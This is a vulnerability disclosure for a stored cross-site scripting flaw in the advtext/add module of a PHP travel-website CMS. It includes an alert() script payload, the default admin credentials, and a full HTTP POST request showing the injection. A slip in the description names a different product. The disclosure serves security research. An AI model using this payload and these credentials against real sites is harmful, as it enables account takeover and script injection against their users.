# PHP-based travel website-CMS advtext add Stored Cross-Site Scripting(XSS)

**Exploit Title: PHP-based travel website-CMS advtext/add exists in XSS vulnerability**

**Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc**

**Vendor Homepage: [GitHub - baowzh/hfly: php版旅游网站](https://github.com/baowzh/hfly)**

**Software Link: [GitHub - baowzh/hfly: php版旅游网站](https://github.com/baowzh/hfly)**

**CMSName: PHP-based travel website-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

Persistent XSS (or Stored XSS) attack is one of the three major categories of XSS attacks, the others being Non-Persistent (or Reflected) XSS and DOM-based XSS. In general, XSS attacks are based on the victim’s trust in a legitimate, but vulnerable, website or web application.Product Show Room Site does not filter the content correctly at the "advtext/add" module, resulting in the generation of stored XSS.

Payload used:

```
XSS TEST<script>alert('xss');</script>## Proof of Concept
```

login a defalut account

`admin/admin@123`

request_body

```
POST /admin/index.php/advtext/add HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 196
Content-Type: application/x-www-form-urlencoded
Cookie: ADMIN_PHPSESSID=sj5k234u5eue0uof0k099k35j7; current_city=nanning; WEB_PHPSESSID=1sctd026e5pvjv02v6ksbbtrj2; Hm_lvt_8987594b0b7682191cafc4396e168113=1764236266; HMACCOUNT=36908916AD850A67; __51cke__=; Hm_lpvt_8987594b0b7682191cafc4396e168113=1764237473; __tins__17819771=%7B%22sid%22%3A%201764236266063%2C%20%22vd%22%3A%2019%2C%20%22expires%22%3A%201764239273004%7D; __51laig__=19
Host: 172.24.6.217:88
Origin: http://172.24.6.217:88
Referer: http://172.24.6.217:88/admin/index.php/advtext/edit/id/49
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36

title=XSS+TEST%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E&start_time=2025-11-27&end_time=2025-11-28&area_id=16&status=1&sort=1&url=https%3A%2F%2F111.1.1.1&submit=+%E4%BF%9D+%E5%AD%98+F%9D+%E5%AD%98+
```

<img width="2285" height="1119" alt="2025-11-27-18-05-16-image" src="https://github.com/user-attachments/assets/84670b46-2b12-4ab5-bed2-0eb86064dbb6" />


XSS-Payload : `XSS TEST<script>alert('xss');</script>`

<img width="1631" height="526" alt="2025-11-27-18-03-16-image" src="https://github.com/user-attachments/assets/407b9b0e-fb6a-4815-8d8a-fe4c50f859be" />


source_code

<img width="1356" height="985" alt="2025-11-27-18-09-28-image" src="https://github.com/user-attachments/assets/a452cf1b-f4a3-40e3-9e22-d6a2324c1bf6" />
